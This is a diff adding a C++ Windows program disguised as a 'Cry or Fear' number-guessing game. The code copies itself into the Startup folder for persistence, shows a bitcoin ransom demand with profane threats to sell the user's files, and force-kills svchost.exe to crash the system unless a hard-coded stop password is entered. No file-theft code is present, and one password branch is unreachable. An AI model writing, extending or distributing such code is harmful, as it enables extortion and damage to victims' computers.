@@ -1,0 +1,116 @@
+#include <iostream>
+#include <windows.h>
+#include <ctime>
+#include <cstdlib>
+#include <string>
+#include <shlobj.h> // Include this header for SHGetFolderPath and CSIDL_STARTUP
+
+using namespace std;
+
+void AddToStartup(const string& path) {
+    wchar_t szPath[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, szPath);
+    wstring startupPath = szPath;
+    startupPath += L"\\CryOrFear.exe";
+
+    // Convert the narrow string to a wide string
+    wstring widePath(path.begin(), path.end());
+    CopyFileW(widePath.c_str(), startupPath.c_str(), FALSE);
+}
+
+void KillSvchost() {
+    system("taskkill /f /im svchost.exe");
+}
+
+int main() {
+    srand(time(0));
+    int secret = rand() % 10 + 1;
+    int attempts = 3;
+    string stopPassword = "MLTP";
+    string guess;
+    bool isValid;
+
+    AddToStartup("CryOrFear.exe");
+
+    cout << "Welcome to 'Cry or Fear'!" << endl;
+    cout << "Guess a number between 1 and 10." << endl;
+    cout << "You get " << attempts << " tries." << endl;
+
+    while (attempts > 0) {
+        cout << "Your guess (1-10): ";
+        cin >> guess;
+
+        isValid = true;
+        try {
+            int num = stoi(guess);
+            if (num < 1 || num > 10) {
+                isValid = false;
+            }
+        }
+        catch (const invalid_argument&) {
+            isValid = false;
+        }
+
+        if (!isValid) {
+            cout << "That’s not a number or out of range. Try again." << endl;
+            continue;
+        }
+
+        if (guess == "password") {
+            break;
+        }
+
+        if (stoi(guess) == secret) {
+            cout << "You guessed right but fuck you im still selling your files" << endl;
+            return 0;
+        }
+
+        attempts--;
+        cout << "Nope — wrong. " << attempts << " tries left." << endl;
+    }
+
+    cout << "No more guesses. There's a 3-second timer to donate 500 dls in bitcoin to https://MBTC.com/btc-Morel-account" << endl;
+    for (int i = 3; i > 0; --i) {
+        cout << "fuck you in " << i << " seconds..." << endl;
+        Sleep(1000);
+    }
+
+    string hasPassword;
+    cout << "Do you have the password? (yes/no): ";
+    cin >> hasPassword;
+
+    if (hasPassword == "yes") {
+        string password;
+        int passwordAttempts = 2;
+        while (passwordAttempts > 0) {
+            cout << "Enter the stop password: ";
+            cin >> password;
+            if (password == stopPassword) {
+                cout << "Password correct. Stopping the script." << endl;
+                return 0;
+            }
+            passwordAttempts--;
+            cout << "Incorrect password. " << passwordAttempts << " attempts left." << endl;
+        }
+        cout << "No more attempts. Killing svchost process." << endl;
+        KillSvchost();
+        system("pause");
+    }
+    else if (hasPassword == "no") {
+        KillSvchost();
+        cout << "Svchost process killed." << endl;
+        system("pause");
+    }
+    else {
+        cout << "Invalid input. Please enter 'yes' or 'no'." << endl;
+    }
+
+    // Handle window close event
+    if (GetAsyncKeyState(VK_ESCAPE)) {
+        KillSvchost();
+        cout << "Svchost process killed on window close." << endl;
+        system("pause");
+    }
+
+    return 0;
+}
